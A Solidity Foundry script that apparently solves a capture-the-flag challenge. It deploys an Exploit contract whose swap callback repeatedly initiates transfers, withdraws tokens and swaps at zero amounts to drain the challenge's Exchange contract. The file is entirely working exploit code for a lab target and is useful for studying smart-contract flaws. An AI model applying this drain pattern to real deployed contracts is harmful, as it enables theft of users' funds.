// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.6.2 <0.9.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

import "src/Exchange.sol";
import "src/Setup.sol";

contract pwnSolve is Script {
    Setup public setup;
    address public setupAddress;
    uint user1PrivateKey;
    address user1Address;

    function run() external {
        setupAddress = vm.envAddress("GAME");
        user1PrivateKey = vm.envUint("USER1_PRIVKEY");
        user1Address = vm.addr(user1PrivateKey);
        setup = Setup(setupAddress);

        vm.startBroadcast(user1PrivateKey);

        Exploit exploit;
        exploit = new Exploit(address(setup));
        exploit.exploit();
        exploit.exploit();
        exploit.exploit();
    }
}

contract Exploit {
    Setup public setup;
    Exchange public exchange;
    IToken public token1;
    IToken public token2;
    IToken public token3;

    uint count = 0;
    constructor(address _setup) {
        setup = Setup(_setup);
        exchange = setup.target();
        token1 = setup.token1();
        token2 = setup.token2();
        token3 = setup.token3();
    }

    function exploit() public {
        exchange.swap();
    }

    function doSwap() public {
        if (count == 0) {
            exchange.initiateTransfer(address(token1));
            exchange.withdraw(address(token1), 200000);
            exchange.swapTokens(address(token1), address(token2), 0, 0);
        } else if (count == 1) {
            exchange.initiateTransfer(address(token2));
            exchange.withdraw(address(token2), 200000);
            exchange.swapTokens(address(token2), address(token1), 0, 0);
        } else {
            exchange.initiateTransfer(address(token3));
            exchange.withdraw(address(token3), 400000);
            exchange.swapTokens(address(token3), address(token2), 0, 0);
        }
        count++;
    }
}
